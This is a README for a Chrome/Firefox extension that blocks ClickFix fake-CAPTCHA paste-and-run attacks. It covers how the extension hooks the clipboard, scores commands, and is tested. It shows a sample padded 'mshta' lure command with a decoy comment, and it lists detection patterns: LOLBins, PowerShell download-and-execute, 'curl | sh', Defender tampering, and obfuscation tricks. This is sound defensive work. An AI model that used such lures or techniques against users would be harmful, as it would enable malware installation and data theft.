# ClickFix Guard

A browser extension for **Chrome and Firefox** that stops *ClickFix* attacks
(also called fake-CAPTCHA or "paste-and-run" attacks). The page you're on
copies a malicious command to your clipboard, then talks you into pasting it
into **Win+R**, PowerShell or Terminal.

![Warning shown when a fake CAPTCHA page copies a malicious command](docs/warning.png)

## The threat

ClickFix needs no exploit and no file download, so browser download scanning,
SmartScreen and Gatekeeper never see it. A typical attack goes like this:

1. A compromised or malicious page shows a fake CAPTCHA, a "fix this error"
   prompt or a browser-update banner.
2. When you click "I'm not a robot", the page silently runs
   `navigator.clipboard.writeText(...)` with something like
   `mshta http://…/verify.hta                 # ✅ I am not a robot - reCAPTCHA Verification ID: 7537`.
3. It tells you to press **Win+R → Ctrl+V → Enter**. The padding and the
   decoy comment mean the Run box only shows the reassuring "verification"
   text.
4. The command pulls down a loader or infostealer (Lumma, StealC, the
   AMOS/Atomic macOS stealer, …).

Campaigns now also target macOS (`curl … | bash`, `osascript`) and hide the
lure in compromised sites' iframes.

## What ClickFix Guard does

- **Intercepts every way a page can write to the clipboard:**
  `navigator.clipboard.writeText` / `write`, `clipboardData.setData` in a
  copy event, `document.execCommand("copy")` on a hidden textarea, and
  Ctrl+C on disguised selections. This works in every frame, including
  cross-origin iframes.
- **Analyses the text as a command.** It normalises obfuscation (`p^o^w^e^r`,
  `` i`e`x ``, `'pow'+'ershell'`, zero-width characters, Run-dialog padding)
  and decodes `-EncodedCommand` and base64 payloads *for inspection only*. It
  then scores what it finds: Windows LOLBins (mshta, rundll32, regsvr32,
  certutil, bitsadmin, msiexec, finger, conhost --headless), PowerShell
  download-and-execute, hidden windows, Defender tampering, macOS/Linux
  `curl | sh`, `base64 -d | sh`, osascript and quarantine stripping, raw-IP
  or abused hosts, and fake "verification" comments.
- **Adds page context**, but only when the text already looks like a command.
  Phrases like "Press Win + R", "Ctrl + V" or "verify you are human" raise
  the score. Ordinary copies on such pages are never blocked.
- **Block:** the malicious command is never written to the clipboard. A
  harmless note goes there instead, starting with `#` so pasting it into Run,
  cmd, PowerShell or bash does nothing. A full-page warning explains what
  happened and what to do if you already ran something.
- **Warn:** legitimate-but-risky installer one-liners (e.g.
  `curl -fsSL https://get.docker.com | sh`, the Chocolatey install command)
  are copied unchanged, with a small dismissible notice.
- A **badge and popup** show recent detections. Everything stays in
  `storage.local` on your device. No network requests, no telemetry,
  `storage` is the only permission.

## Install

**From the repo (developer mode):**

- **Chrome / Edge / Brave:** open `chrome://extensions`, turn on
  *Developer mode*, click *Load unpacked* and pick this folder.
- **Firefox (142+):** open `about:debugging#/runtime/this-firefox`, click
  *Load Temporary Add-on* and pick `manifest.json`. For a permanent install,
  build the `.xpi` and sign it through AMO.

**Packages:**

```bash
python3 tools/build.py   # dist/clickfix-guard-1.0.0-chrome.zip + -firefox.xpi
```

One Manifest V3 codebase serves both browsers. The background is declared as
`service_worker` (Chrome) and `scripts` (Firefox), and each browser ignores
the key it doesn't use. The page hook uses `"world": "MAIN"` content scripts
(Chrome 111+, Firefox 128+). APIs go through `globalThis.browser ?? chrome`.

## Testing

```bash
npm test               # analyzer unit tests (node:test)
npm run e2e            # real-browser tests: Chromium (CDP) + Firefox (WebDriver BiDi)
npm run lint:firefox   # Mozilla addons-linter on the built .xpi
```

The end-to-end suite loads the unpacked extension into headless Chromium and
Firefox. It serves the lure pages in `test/pages/` and clicks them like a
user, then checks what actually lands on the clipboard:

| Case | Chromium | Firefox |
|---|---|---|
| Fake CAPTCHA via `clipboard.writeText` → notice on clipboard, block warning | ✅ | ✅ |
| Hidden textarea + `execCommand('copy')` | ✅ | ✅ |
| Copy-event hijack via `setData` (macOS lure) | ✅ | ✅ |
| Lure in a cross-origin iframe → warning relayed to the top page | ✅ | ✅ |
| Benign `npm install` copy → unchanged, no warning | ✅ | ✅ |
| Docker installer one-liner → unchanged, warning toast | ✅ | ✅ |
| Popup lists the logged detections | ✅ | skipped¹ |

¹ WebDriver BiDi can't open `moz-extension://` pages. The Firefox background
is still exercised: the iframe case passes only if the background forwards
the warning.

Current result: **26/26** browser checks, **11/11** analyzer tests,
**0 errors** from `addons-linter`. The one linter warning is the
`service_worker` key, which Firefox ignores by design.

Every test payload points at reserved addresses (RFC 5737 TEST-NET IPs,
`.example` / `.test` domains). The extension never executes or fetches
anything it analyses.

## Limitations

- **This is a heuristic detector, not a guarantee.** A lure that gets the user
  to *type* the command, or to copy it from outside the browser, is out of
  scope. So is an obfuscation scheme the analyzer doesn't unwrap.
- The page hook runs in the page's own JavaScript world, so a determined page
  can try to reach unwrapped clipboard functions. For example, it could grab
  them from a freshly created `about:blank` iframe before the hook loads
  there. Kernel-level and EDR controls (blocking `mshta`, Run-dialog
  auditing) remain the stronger layer.
- A page can fire fake detection events to show spurious warnings. It can't
  use them to *suppress* a real block.
- Developer one-liners that download and execute code get a warning, not a
  block. That keeps false positives low, but a lure that perfectly mimics an
  installer on a neutral-looking page would only be warned about.

## Layout

```
manifest.json          MV3 manifest for Chrome + Firefox
src/analyzer.js        command analysis (shared by the page hook and Node tests)
src/inject.js          MAIN-world clipboard hooks
src/content.js         isolated-world bridge + warning UI (closed shadow DOM)
src/background.js      detection log, badge, relay to the top frame
popup/                 recent detections
test/                  analyzer tests, e2e harness, lure/benign test pages
tools/                 build packaging, icon generator
```

MIT licensed.
